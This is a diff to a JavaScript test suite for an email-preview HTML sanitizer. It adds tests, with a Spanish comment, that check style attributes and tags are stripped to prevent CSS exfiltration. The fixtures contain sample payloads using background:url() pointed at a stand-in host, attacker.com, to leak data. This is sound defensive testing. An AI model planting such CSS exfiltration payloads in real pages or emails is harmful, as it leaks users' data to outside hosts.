@@ -100,10 +100,26 @@ describe('sanitize utilities', () => {
 			expect(sanitizeEmailHtml('')).toBe('');
 		});
 
-		it('allows style attributes (needed for email templates)', () => {
-			const html = '<p style="color:red;font-size:14px">Styled email</p>';
+		// SECURITY: aunque DOMPurify por default permite `style` attrs/tags,
+		// los strippeamos en este sanitizer porque se usa para PREVIEW de
+		// emails que puede contener data controlada por admins de comunidad
+		// (overlay names). CSS exfil via `style="background:url(...)"` sería
+		// posible si los permitimos. El email REAL no pasa por aquí.
+		it('strips style attributes (CSS exfil prevention in preview)', () => {
+			const html =
+				'<p style="background:url(https://attacker.com/leak?data=secret)">Preview content</p>';
 			const result = sanitizeEmailHtml(html);
-			expect(result).toContain('style=');
+			expect(result).not.toContain('style=');
+			expect(result).not.toContain('attacker.com');
+			expect(result).toContain('Preview content');
+		});
+
+		it('strips style tags', () => {
+			const html =
+				'<style>body{background:url(https://attacker.com/leak)}</style><p>Email</p>';
+			const result = sanitizeEmailHtml(html);
+			expect(result).not.toContain('<style');
+			expect(result).not.toContain('attacker.com');
 		});
 
 		it('strips script tags', () => {
